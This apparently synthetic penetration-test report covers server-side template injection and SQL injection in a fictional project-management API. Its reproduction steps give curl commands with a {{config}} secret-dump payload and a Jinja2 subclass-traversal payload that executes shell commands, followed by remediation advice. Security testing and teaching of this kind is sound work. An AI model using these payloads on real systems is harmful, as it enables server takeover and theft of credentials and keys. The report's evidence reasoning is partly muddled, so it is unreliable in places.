## System

- System: TaskFlow Collaboration API v1.3.0
- Domain: SaaS / PROJECT MANAGEMENT
- Example ID: INJ-0110
- Risk ID: RISK-INJ-110
- Vulnerability: SSTI (Server-Side Template Injection)

## Findings

### 1. SSTI on `/api/v2/orders?username=` (HAR Primary)

**HAR evidence**: `GET /api/v2/orders?username={{7*7}}` → HTTP 200 with all user records: `username: "admin"`, `password_hash: "$2b$12$secret"`, `role: "ADMIN"`, `username: "user2"`.

**SSTI (Server-Side Template Injection)**: Section 2.0 — "Jinja2/Nunjucks template engine — primary data store." The `username` parameter is passed directly into a Jinja2/Nunjucks template expression. If the template engine evaluates `{{7*7}}` and returns `49` in the response, SSTI is confirmed. Full SSTI enables: server config dump (`{{config}}`), file read, and Remote Code Execution (RCE) via Python/JS subclass traversal.

**Context inconsistency**: Section 3.0 shows raw SQL string concatenation (`SELECT * FROM orders WHERE username = '${req.query.username}'`) and the HAR response contains SQL-structured user data. The primary active vulnerability may be SQLi in addition to SSTI. Both vectors are demonstrated since `db_owner` privileges (Section 6.0) amplify SQLi severity and the template engine creates the SSTI vector.

**SaaS / Project Management impact**: `orders` table represents project task orders or work orders. Admin credential theft (`role: "ADMIN"`) enables full project management platform takeover, access to all teams' project data, task manipulation, and customer data exfiltration. SSTI RCE compromises the hosting server.

**Root cause**: Jinja2/Nunjucks template renders user input unsandboxed; SQL raw string concatenation — no parameterization, no WAF, no input validation on legacy endpoint (RISK-INJ-110).

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.taskflow-collab.example.com/api/v2/orders?username=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected: Returns matching records only.

**Step 2 — SSTI probe: arithmetic expression (primary HAR attack):**

```bash
curl -s "https://api.taskflow-collab.example.com/api/v2/orders?username={{7*7}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected secure: 400 Bad Request / raw string `{{7*7}}` returned / sanitized error.  
Expected vulnerable (SSTI): Response contains `49` — template executed. Or HTTP 200 with all user records (SQLi path).

**Step 3 — SSTI escalation: config dump (Jinja2):**

```bash
curl -s "https://api.taskflow-collab.example.com/api/v2/orders?username={{config}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: Server configuration including secret keys, DB connection strings, API keys returned.

**Step 4 — SSTI RCE attempt (Jinja2/Python subclass traversal):**

```bash
curl -s "https://api.taskflow-collab.example.com/api/v2/orders?username={{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: OS command output confirming Remote Code Execution.

**Step 5 — Verbose error confirmation:**

```bash
curl -s "https://api.taskflow-collab.example.com/api/v2/orders?username='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected (if misconfigured): SQL/template syntax error leaking table name, engine version.

## Evidence

- **HAR**: `GET /api/v2/orders?username={{7*7}}` → HTTP 200 → all user records with `password_hash` and `role: "ADMIN"`.
- **Section 2.0**: Jinja2/Nunjucks template engine — template injection vector.
- **Section 3.0 (RISK-INJ-110)**: raw SQL string concatenation — SQLi vector.
- **Section 6.0**: `db_owner` privileges, no WAF, verbose errors.

## Remediation

- **Sandbox template engine**: Jinja2 sandbox (`SandboxedEnvironment`) — disable `__class__`, `__mro__`, `__subclasses__` access.
- **Never render user input in templates**: pass as context variables only.
- **Parameterized queries**: replace SQL string concatenation with `?` or named parameters (RISK-INJ-110 remediation).
- **Restrict DB account**: least-privilege — SELECT only on required tables.
- **Disable verbose error messages in production**.
- **Input validation**: reject `{{`, `}}`, `{%`, `%}`, `'`, `;`, `--` in query parameters.
